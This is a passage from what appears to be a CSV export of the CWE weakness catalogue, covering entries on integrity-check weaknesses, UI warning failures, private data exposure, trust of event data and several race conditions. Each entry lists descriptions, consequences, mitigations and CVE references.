PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Other:IMPACT:Other::\",\"\",\"\",\"::REFERENCE:CVE-2005-2260:DESCRIPTION:Browser user interface does not distinguish between user-initiated and synthetic events.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2260::REFERENCE:CVE-2005-2801:DESCRIPTION:Product does not compare all required data in two separate elements, causing it to think they are the same, leading to loss of ACLs. Similar to Same Name error.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2801::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Insufficient Type Distinction::\",,\"::TYPE:Relationship:NOTE:Overlaps others, e.g. Multiple Interpretation Errors.::\",\n353,\"Missing Support for Integrity Check\",Base,Draft,\"The product uses a transmission protocol that does not include a mechanism for verifying the integrity of the data during transmission, such as a checksum.\",\"If integrity check values or checksums are omitted from a protocol, there is no way of determining if data has been corrupted in transmission. The lack of checksum functionality in a protocol removes the first application-level check of data that can be used. The end-to-end philosophy of checks states that integrity checks should be performed at the lowest level that they can be completely implemented. Excluding further sanity checks and input validation performed by applications, the protocol's checksum is the most important level of checksum, since it can be performed more completely than at any previous level and takes into account entire messages, as opposed to single packets.\",::NATURE:ChildOf:CWE ID:345:VIEW ID:1000:ORDINAL:Primary::NATURE:PeerOf:CWE ID:354:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Other:IMPACT:Other:NOTE:Data that is parsed and used may be corrupted.::SCOPE:Non-Repudiation:SCOPE:Other:IMPACT:Hide Activities:IMPACT:Other:NOTE:Without a checksum it is impossible to determine if any changes have been made to the data after it was sent.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Add an appropriately sized checksum to the protocol, ensuring that data received may be simply validated before it is parsed and used.::PHASE:Implementation:DESCRIPTION:Ensure that the checksums present in the protocol design are properly implemented and added to each message before it is sent.::\",\"\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Failure to add integrity check value::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 2-4:ENTRY NAME:Req SP.03.03 RE(1)::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 2-4:ENTRY NAME:Req SP.04.02 RE(1)::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 2-4:ENTRY NAME:Req SP.11.06 RE(2)::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 3.1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-1:ENTRY NAME:Req SD-1::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 4-2:ENTRY NAME:Req CR 3.1::\",::13::14::389::39::665::74::75::,\"\",\n354,\"Improper Validation of Integrity Check Value\",Base,Draft,\"The product does not validate or incorrectly validates the integrity check values or checksums of a message. This may prevent it from detecting if the data has been modified or corrupted in transmission.\",\"Improper validation of checksums before use results in an unnecessary risk that can easily be mitigated. The protocol specification describes the algorithm used for calculating the checksum. It is then a simple matter of implementing the calculation and verifying that the calculated checksum and the received checksum match. Improper verification of the calculated checksum and the received checksum can lead to far greater consequences.\",::NATURE:ChildOf:CWE ID:345:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:345:VIEW ID:1003:ORDINAL:Primary::NATURE:ChildOf:CWE ID:754:VIEW ID:1000::NATURE:PeerOf:CWE ID:353:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Integrity:SCOPE:Other:IMPACT:Modify Application Data:IMPACT:Other:NOTE:Integrity checks usually use a secret key that helps authenticate the data origin. Skipping integrity checking generally opens up the possibility that new data from an invalid source can be injected.::SCOPE:Integrity:SCOPE:Other:IMPACT:Other:NOTE:Data that is parsed and used may be corrupted.::SCOPE:Non-Repudiation:SCOPE:Other:IMPACT:Hide Activities:IMPACT:Other:NOTE:Without a checksum check, it is impossible to determine if any changes have been made to the data after it was sent.::\",\"\",\"::PHASE:Implementation:DESCRIPTION:Ensure that the checksums present in messages are properly checked in accordance with the protocol specification before they are parsed and used.::\",\"\",,,\"::TAXONOMY NAME:ISA/IEC 62443:ENTRY ID:Part 3-3:ENTRY NAME:Req SR 3.1::TAXONOMY NAME:CLASP:ENTRY NAME:Failure to check integrity check value::\",::145::463::75::,\"\",\n356,\"Product UI does not Warn User of Unsafe Actions\",Base,Incomplete,\"The product's user interface does not warn the user before undertaking an unsafe action on behalf of that user. This makes it easier for attackers to trick users into inflicting damage to their system.\",\"Product systems should warn users that a potentially dangerous action may occur if the user proceeds. For example, if the user downloads a file from an unknown source and attempts to execute the file on their machine, then the application's GUI can indicate that the file is unsafe.\",::NATURE:ChildOf:CWE ID:221:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Non-Repudiation:IMPACT:Hide Activities::\",\"\",\"\",\"::REFERENCE:CVE-1999-1055:DESCRIPTION:Product does not warn user when document contains certain dangerous functions or macros.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-1055::REFERENCE:CVE-1999-0794:DESCRIPTION:Product does not warn user when document contains certain dangerous functions or macros.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0794::REFERENCE:CVE-2000-0277:DESCRIPTION:Product does not warn user when document contains certain dangerous functions or macros.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0277::REFERENCE:CVE-2000-0517:DESCRIPTION:Product does not warn user about a certificate if it has already been accepted for a different site. Possibly resultant.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0517::REFERENCE:CVE-2005-0602:DESCRIPTION:File extractor does not warn user if setuid/setgid files could be extracted. Overlaps privileges/permissions.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0602::REFERENCE:CVE-2000-0342:DESCRIPTION:E-mail client allows bypass of warning for dangerous attachments via a Windows .LNK file that refers to the attachment.:LINK:https://www.cve.org/CVERecord?id=CVE-2000-0342::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Product UI does not warn user of unsafe actions::\",,\"::TYPE:Relationship:NOTE:Often resultant, e.g. in unhandled error conditions.::TYPE:Relationship:NOTE:Can overlap privilege errors, conceptually at least.::\",\n357,\"Insufficient UI Warning of Dangerous Operations\",Base,Draft,\"The user interface provides a warning to a user regarding dangerous or sensitive operations, but the warning is not noticeable enough to warrant attention.\",\"\",::NATURE:ChildOf:CWE ID:693:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Non-Repudiation:IMPACT:Hide Activities::\",\"\",\"\",\"::REFERENCE:CVE-2007-1099:DESCRIPTION:User not sufficiently warned if host key mismatch occurs:LINK:https://www.cve.org/CVERecord?id=CVE-2007-1099::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Insufficient UI warning of dangerous operations::\",,\"\",\n358,\"Improperly Implemented Security Check for Standard\",Base,Draft,\"The product does not implement or incorrectly implements one or more security-relevant checks as specified by the design of a standardized algorithm, protocol, or technique.\",\"\",::NATURE:ChildOf:CWE ID:573:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:693:VIEW ID:1000::NATURE:CanAlsoBe:CWE ID:345:VIEW ID:1000::NATURE:CanAlsoBe:CWE ID:290:VIEW ID:1000::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation:NOTE:This is an implementation error, in which the algorithm/technique requires certain security-related behaviors or conditions that are not implemented or checked properly, thus causing a vulnerability.::\",\"\",,\"::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism::\",\"\",\"\",\"::REFERENCE:CVE-2002-0862:DESCRIPTION:Browser does not verify Basic Constraints of a certificate, even though it is required, allowing spoofing of trusted certificates.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0862::REFERENCE:CVE-2002-0970:DESCRIPTION:Browser does not verify Basic Constraints of a certificate, even though it is required, allowing spoofing of trusted certificates.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0970::REFERENCE:CVE-2002-1407:DESCRIPTION:Browser does not verify Basic Constraints of a certificate, even though it is required, allowing spoofing of trusted certificates.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1407::REFERENCE:CVE-2005-0198:DESCRIPTION:Logic error prevents some required conditions from being enforced during Challenge-Response Authentication Mechanism with MD5 (CRAM-MD5).:LINK:https://www.cve.org/CVERecord?id=CVE-2005-0198::REFERENCE:CVE-2004-2163:DESCRIPTION:Shared secret not verified in a RADIUS response packet, allowing authentication bypass by spoofing server replies.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2163::REFERENCE:CVE-2005-2181:DESCRIPTION:Insufficient verification in VoIP implementation, in violation of standard, allows spoofed messages.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2181::REFERENCE:CVE-2005-2182:DESCRIPTION:Insufficient verification in VoIP implementation, in violation of standard, allows spoofed messages.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2182::REFERENCE:CVE-2005-2298:DESCRIPTION:Security check not applied to all components, allowing bypass.:LINK:https://www.cve.org/CVERecord?id=CVE-2005-2298::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Improperly Implemented Security Check for Standard::\",,\"::TYPE:Relationship:NOTE:This is a missing step error on the product side, which can overlap weaknesses such as insufficient verification and spoofing. It is frequently found in cryptographic and authentication errors. It is sometimes resultant.::\",\n359,\"Exposure of Private Personal Information to an Unauthorized Actor\",Base,Incomplete,\"The product does not properly prevent a person's private, personal information from being accessed by actors who either (1) are not explicitly authorized to access the information or (2) do not have the implicit consent of the person about whom the information is collected.\",\"There are many types of sensitive information that products must protect from attackers, including system data, communications, configuration, business secrets, intellectual property, and an individual's personal (private) information. Private personal information may include a password, phone number, geographic location, personal messages, credit card number, etc. Private information is important to consider whether the person is a user of the product, or part of a data set that is processed by the product. An exposure of private information does not necessarily prevent the product from working properly, and in fact the exposure might be intended by the developer, e.g. as part of data sharing with other organizations. However, the exposure of personal private information can still be undesirable or explicitly prohibited by law or regulation. Some types of private information include: Government identifiers, such as Social Security Numbers Contact information, such as home addresses and telephone numbers Geographic location - where the user is (or was) Employment history Financial data - such as credit card numbers, salary, bank accounts, and debts Pictures, video, or audio Behavioral patterns - such as web surfing history, when certain activities are performed, etc. Relationships (and types of relationships) with others - family, friends, contacts, etc. Communications - e-mail addresses, private messages, text messages, chat logs, etc. Health - medical conditions, insurance status, prescription records Account passwords and other credentials Some of this information may be characterized as PII (Personally Identifiable Information), Protected Health Information (PHI), etc. Categories of private information may overlap or vary based on the intended usage or the policies and practices of a particular industry. Sometimes data that is not labeled as private can have a privacy implication in a different context. For example, student identification numbers are usually not considered private because there is no explicit and publicly-available mapping to an individual student's personal information. However, if a school generates identification numbers based on student social security numbers, then the identification numbers should be considered private.\",::NATURE:ChildOf:CWE ID:200:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Mobile:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"::TERM:Privacy violation::TERM:Privacy leak::TERM:Privacy leakage::\",\"::PHASE:Architecture and Design:NOTE:OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.::PHASE:Implementation::PHASE:Operation::\",\"\",,\"::SCOPE:Confidentiality:IMPACT:Read Application Data::\",\"::METHOD:Architecture or Design Review:DESCRIPTION:Private personal data can enter a program in a variety of ways: Directly from the user in the form of a password or personal information Accessed from a database or other data store by the application Indirectly from a partner or other third party If the data is written to an external location - such as the console, file system, or network - a privacy violation may occur.:EFFECTIVENESS:High::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Requirements:DESCRIPTION:Identify and consult all relevant regulations for personal privacy. An organization may be required to comply with certain federal and state regulations, depending on its location, the type of business it conducts, and the nature of any private data it handles. Regulations may include Safe Harbor Privacy Framework [REF-340], Gramm-Leach Bliley Act (GLBA) [REF-341], Health Insurance Portability and Accountability Act (HIPAA) [REF-342], General Data Protection Regulation (GDPR) [REF-1047], California Consumer Privacy Act (CCPA) [REF-1048], and others.::PHASE:Architecture and Design:DESCRIPTION:Carefully evaluate how secure design may interfere with privacy, and vice versa. Security and privacy concerns often seem to compete with each other. From a security perspective, all important operations should be recorded so that any anomalous activity can later be identified. However, when private data is involved, this practice can in fact create risk. Although there are many ways in which private data can be handled unsafely, a common risk stems from misplaced trust. Programmers often trust the operating environment in which a program runs, and therefore believe that it is acceptable store private information on the file system, in the registry, or in other locally-controlled resources. However, even if access to certain resources is restricted, this does not guarantee that the individuals who do have access can be trusted.::\",\"\",,,\"::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Privacy Violation::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:FIO13-J:ENTRY NAME:Do not log sensitive information outside a trust boundary::\",::464::467::498::508::,\"::TYPE:Maintenance:NOTE:This entry overlaps many other entries that are not organized around the kind of sensitive information that is exposed. However, because privacy is treated with such importance due to regulations and other factors, and it may be useful for weakness-finding tools to highlight capabilities that detect personal private information instead of system information, it is not clear whether - and how - this entry should be deprecated.::\",\n360,\"Trust of System Event Data\",Base,Incomplete,\"Security based on event locations are insecure and can be spoofed.\",\"Events are a messaging system which may provide control data to programs listening for events. Events often do not have any type of authentication framework to allow them to be verified from a trusted source. Any application, in Windows, on a given desktop can send a message to any window on the same desktop. There is no authentication framework for these messages. Therefore, any message can be used to manipulate any process on the desktop if the process does not check the validity and safeness of those messages.\",::NATURE:ChildOf:CWE ID:345:VIEW ID:1000:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:IMPACT:Execute Unauthorized Code or Commands:NOTE:If one trusts the system-event information and executes commands based on it, one could potentially take actions based on a spoofed identity.::\",\"\",\"::PHASE:Architecture and Design:DESCRIPTION:Never trust or rely any of the information in an Event for security.::\",\"::REFERENCE:CVE-2004-0213:DESCRIPTION:Attacker uses Shatter attack to bypass GUI-enforced protection for CVE-2003-0908.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0213::\",,,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Trust of system event data::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP29:ENTRY NAME:Faulty endpoint authentication::\",,\"\",\n364,\"Signal Handler Race Condition\",Base,Incomplete,\"The product uses a signal handler that introduces a race condition.\",\"Race conditions frequently occur in signal handlers, since signal handlers support asynchronous actions. These race conditions have a variety of root causes and symptoms. Attackers may be able to exploit a signal handler race condition to cause the product state to be corrupted, possibly leading to a denial of service or even code execution. These issues occur when non-reentrant functions, or state-sensitive actions occur in the signal handler, where they may be called at any time. These behaviors can violate assumptions being made by the regular code that is interrupted, or by other signal handlers that may also be invoked. If these functions are called at an inopportune moment - such as while a non-reentrant function is already running - memory corruption could occur that may be exploitable for code execution. Another signal race condition commonly found occurs when free is called within a signal handler, resulting in a double free and therefore a write-what-where condition. Even if a given pointer is set to NULL after it has been freed, a race condition still exists between the time the memory was freed and the pointer was set to NULL. This is especially problematic if the same signal handler has been set for more than one signal -- since it means that the signal handler itself may be reentered. There are several known behaviors related to signal handlers that have received the label of signal handler race condition: Shared state (e.g. global data or static variables) that are accessible to both a signal handler and regular code Shared state between a signal handler and other signal handlers Use of non-reentrant functionality within a signal handler - which generally implies that shared state is being used. For example, malloc() and free() are non-reentrant because they may use global or static data structures for managing memory, and they are indirectly used by innocent-seeming functions such as syslog(); these functions could be exploited for memory corruption and, possibly, code execution. Association of the same signal handler function with multiple signals - which might imply shared state, since the same code and resources are accessed. For example, this can be a source of double-free and use-after-free weaknesses. Use of setjmp and longjmp, or other mechanisms that prevent a signal handler from returning control back to the original functionality While not technically a race condition, some signal handlers are designed to be called at most once, and being called more than once can introduce security problems, even when there are not any concurrent calls to the signal handler. This can be a source of double-free and use-after-free weaknesses. Signal handler vulnerabilities are often classified based on the absence of a specific protection mechanism, although this style of classification is discouraged in CWE because programmers often have a choice of several different mechanisms for addressing the weakness. Such protection mechanisms may preserve exclusivity of access to the shared resource, and behavioral atomicity for the relevant code: Avoiding shared state Using synchronization in the signal handler Using synchronization in the regular code Disabling or masking other signals, which provides atomicity (which effectively ensures exclusivity)\",::NATURE:ChildOf:CWE ID:362:VIEW ID:1000:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:415:VIEW ID:1000::NATURE:CanPrecede:CWE ID:416:VIEW ID:1000::NATURE:CanPrecede:CWE ID:123:VIEW ID:1000::,\"\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Sometimes::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Sometimes::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Modify Application Data:IMPACT:Modify Memory:IMPACT:DoS: Crash, Exit, or Restart:IMPACT:Execute Unauthorized Code or Commands:NOTE:It may be possible to cause data corruption and possibly execute arbitrary code by modifying global variables or data structures at unexpected times, violating the assumptions of code that uses this global data.::SCOPE:Access Control:IMPACT:Gain Privileges or Assume Identity:NOTE:If a signal handler interrupts code that is executing with privileges, it may be possible that the signal handler will also be executed with elevated privileges, possibly making subsequent exploits more severe.::\",\"\",\"::PHASE:Requirements:STRATEGY:Language Selection:DESCRIPTION:Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.::PHASE:Architecture and Design:DESCRIPTION:Design signal handlers to only set flags, rather than perform complex functionality. These flags can then be checked and acted upon within the main program loop.::PHASE:Implementation:DESCRIPTION:Only use reentrant functions within signal handlers. Also, use validation to ensure that state is consistent while performing asynchronous actions that affect the state of execution.::\",\"::REFERENCE:CVE-1999-0035:DESCRIPTION:Signal handler does not disable other signal handlers, allowing it to be interrupted, causing other functionality to access files/etc. with raised privileges:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0035::REFERENCE:CVE-2001-0905:DESCRIPTION:Attacker can send a signal while another signal handler is already running, leading to crash or execution with root privileges:LINK:https://www.cve.org/CVERecord?id=CVE-2001-0905::REFERENCE:CVE-2001-1349:DESCRIPTION:unsafe calls to library functions from signal handler:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1349::REFERENCE:CVE-2004-0794:DESCRIPTION:SIGURG can be used to remotely interrupt signal handler; other variants exist:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0794::REFERENCE:CVE-2004-2259:DESCRIPTION:SIGCHLD signal to FTP server can cause crash under heavy load while executing non-reentrant functions like malloc/free.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2259::\",::Signals::Interprocess Communication::,::System Process::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Signal handler race condition::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Signal Handling Race Conditions::TAXONOMY NAME:CLASP:ENTRY NAME:Race condition in signal handler::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP19:ENTRY NAME:Missing Lock::\",,\"\",\n366,\"Race Condition within a Thread\",Base,Draft,\"If two threads of execution use a resource simultaneously, there exists the possibility that resources may be used while invalid, in turn making the state of execution undefined.\",\"\",::NATURE:ChildOf:CWE ID:362:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:662:VIEW ID:1305:ORDINAL:Primary::NATURE:ChildOf:CWE ID:662:VIEW ID:1340:ORDINAL:Primary::,\"\",::LANGUAGE NAME:C:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C++:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:Java:LANGUAGE PREVALENCE:Undetermined::LANGUAGE NAME:C#:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Other:IMPACT:Alter Execution Logic:IMPACT:Unexpected State:NOTE:The main problem is that -- if a lock is overcome -- data could be altered in a bad state.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:DESCRIPTION:Use locking functionality. This is the recommended solution. Implement some form of locking mechanism around code which alters or reads persistent data in a multithreaded environment.::PHASE:Architecture and Design:DESCRIPTION:Create resource-locking validation checks. If no inherent locking mechanisms exist, use flags and signals to enforce your own blocking scheme when resources are being used by other threads of execution.::\",\"::REFERENCE:CVE-2022-2621:DESCRIPTION:Chain: two threads in a web browser use the same resource (CWE-366), but one of those threads can destroy the resource before the other has completed (CWE-416).:LINK:https://www.cve.org/CVERecord?id=CVE-2022-2621::\",,::System Process::,\"::TAXONOMY NAME:CLASP:ENTRY NAME:Race condition within a thread::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:CON32-C:ENTRY NAME:Prevent data races when accessing bit-fields from multiple threads:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:CON40-C:ENTRY NAME:Do not refer to an atomic variable twice in an expression:MAPPING FIT:CWE More Abstract::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:CON43-C:ENTRY NAME:Do not allow data races in multithreaded code:MAPPING FIT:Exact::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:VNA02-J:ENTRY NAME:Ensure that compound operations on shared variables are atomic::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:VNA03-J:ENTRY NAME:Do not assume that a group of calls to independently atomic methods is atomic::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP19:ENTRY NAME:Missing Lock::\",::26::29::,\"\",\n367,\"Time-of-check Time-of-use (TOCTOU) Race Condition\",Base,Incomplete,\"The product checks the state of a resource before using that resource, but the resource's state can change between the check and the use in a way that invalidates the results of the check. This can cause the product to perform invalid actions when the resource is in an unexpected state.\",\"This weakness can be security-relevant when an attacker can influence the state of the resource between check and use. This can happen with shared resources such as files, memory, or even variables in multithreaded programs.\",::NATURE:ChildOf:CWE ID:362:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:362:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"::TERM:TOCTTOU:DESCRIPTION:The TOCTTOU acronym expands to Time Of Check To Time Of Use.::TERM:TOCCTOU:DESCRIPTION:The TOCCTOU acronym is most likely a typo of TOCTTOU, but it has been used in some influential documents, so the typo is repeated fairly frequently.::\",\"::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Other:IMPACT:Alter Execution Logic:IMPACT:Unexpected State:NOTE:The attacker can gain access to otherwise unauthorized resources.::SCOPE:Integrity:SCOPE:Other:IMPACT:Modify Application Data:IMPACT:Modify Files or Directories:IMPACT:Modify Memory:IMPACT:Other:NOTE:Race conditions such as this kind may be employed to gain read or write access to resources which are not normally readable or writable by the user in question.::SCOPE:Integrity:SCOPE:Other:IMPACT:Other:NOTE:The resource in question, or other resources (through the corrupted one), may be changed in undesirable ways by a malicious user.::SCOPE:Non-Repudiation:IMPACT:Hide Activities:NOTE:If a file or other resource is written in this method, as opposed to in a valid way, logging of the activity may not occur.::SCOPE:Non-Repudiation:SCOPE:Other:IMPACT:Other:NOTE:In some cases it may be possible to delete files a malicious user might not otherwise have access to, such as log files.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect sources (origins of input) with sinks (destinations where the data interacts with external components, a lower layer such as the OS, etc.):EFFECTIVENESS:High::\",\"::PHASE:Implementation:DESCRIPTION:The most basic advice for TOCTOU vulnerabilities is to not perform a check before the use. This does not resolve the underlying issue of the execution of a function on a resource whose state and identity cannot be assured, but it does help to limit the false sense of security given by the check.::PHASE:Implementation:DESCRIPTION:When the file being altered is owned by the current user and group, set the effective gid and uid to that of the current user and group when executing this statement.::PHASE:Architecture and Design:DESCRIPTION:Limit the interleaving of operations on files from multiple processes.::PHASE:Implementation Architecture and Design:DESCRIPTION:If you cannot perform operations atomically and you must share access to the resource between multiple processes or threads, then try to limit the amount of time (CPU cycles) between the check and use of the resource. This will not fix the problem, but it could make it more difficult for an attack to succeed.::PHASE:Implementation:DESCRIPTION:Recheck the resource after the use call to verify that the action was taken appropriately.::PHASE:Architecture and Design:DESCRIPTION:Ensure that some environmental locking mechanism can be used to protect resources effectively.::PHASE:Implementation:DESCRIPTION:Ensure that locking occurs before the check, as opposed to afterwards, such that the resource, as checked, is the same as it is when in use.::\",\"::REFERENCE:CVE-2015-1743:DESCRIPTION:TOCTOU in sandbox process allows installation of untrusted browser add-ons by replacing a file after it has been verified, but before it is executed:LINK:https://www.cve.org/CVERecord?id=CVE-2015-1743::REFERENCE:CVE-2003-0813:DESCRIPTION:A multi-threaded race condition allows remote attackers to cause a denial of service (crash or reboot) by causing two threads to process the same RPC request, which causes one thread to use memory after it has been freed.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0813::REFERENCE:CVE-2004-0594:DESCRIPTION:PHP flaw allows remote attackers to execute arbitrary code by aborting execution before the initialization of key data structures is complete.:LINK:https://www.cve.org/CVERecord?id=CVE-2004-0594::REFERENCE:CVE-2008-2958:DESCRIPTION:chain: time-of-check time-of-use (TOCTOU) race condition in program allows bypass of protection mechanism that was designed to prevent symlink attacks.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2958::REFERENCE:CVE-2008-1570:DESCRIPTION:chain: time-of-check time-of-use (TOCTOU) race condition in program allows bypass of protection mechanism that was designed to prevent symlink attacks.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-1570::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Time-of-check Time-of-use race condition::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:File Access Race Conditions: TOCTOU::TAXONOMY NAME:CLASP:ENTRY NAME:Time of check, time of use race condition::TAXONOMY NAME:CLASP:ENTRY NAME:Race condition in switch::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:FIO01-C:ENTRY NAME:Be careful using functions that use file names for identification::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP20:ENTRY NAME:Race Condition Window::\",::27::29::,\"::TYPE:Relationship:NOTE:TOCTOU issues do not always involve symlinks, and not every symlink issue is a TOCTOU problem.::TYPE:Research Gap:NOTE:Non-symlink TOCTOU issues are not reported frequently, but they are likely to occur in code that attempts to be secure.::\",\n368,\"Context Switching Race Condition\",Base,Draft,\"A product performs a series of non-atomic actions to switch between contexts that cross privilege or other security boundaries, but a race condition allows an attacker to modify or misrepresent the product's behavior during the switch.\",\"This is commonly seen in web browser vulnerabilities in which the attacker can perform certain actions while the browser is transitioning from a trusted to an untrusted domain, or vice versa, and the browser performs the actions on one domain using the trust level and resources of the other domain.\",::NATURE:ChildOf:CWE ID:362:VIEW ID:1000:ORDINAL:Primary::NATURE:CanAlsoBe:CWE ID:364:VIEW ID:1000::,\"::ORDINALITY:Primary:DESCRIPTION:This weakness can be primary to almost anything, depending on the context of the race condition.::ORDINALITY:Resultant:DESCRIPTION:This weakness can be resultant from insufficient compartmentalization (CWE-653), incorrect locking, improper initialization or shutdown, or a number of other weaknesses.::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::,\"\",\"\",\"::PHASE:Architecture and Design::PHASE:Implementation::\",\"\",,\"::SCOPE:Integrity:SCOPE:Confidentiality:IMPACT:Modify Application Data:IMPACT:Read Application Data::\",\"\",\"\",\"::REFERENCE:CVE-2009-1837:DESCRIPTION:Chain: race condition (CWE-362) from improper handling of a page transition in web client while an applet is loading (CWE-368) leads to use after free (CWE-416):LINK:https://www.cve.org/CVERecord?id=CVE-2009-1837::REFERENCE:CVE-2004-2260:DESCRIPTION:Browser updates address bar as soon as user clicks on a link instead of when the page has loaded, allowing spoofing by redirecting to another page using onUnload method. ** this is one example of the role of hooks and context switches, and should be captured somehow - also a race condition of sorts **:LINK:https://www.cve.org/CVERecord?id=CVE-2004-2260::REFERENCE:CVE-2004-0191:DESCRIPTION:XSS when web browser executes Javascript 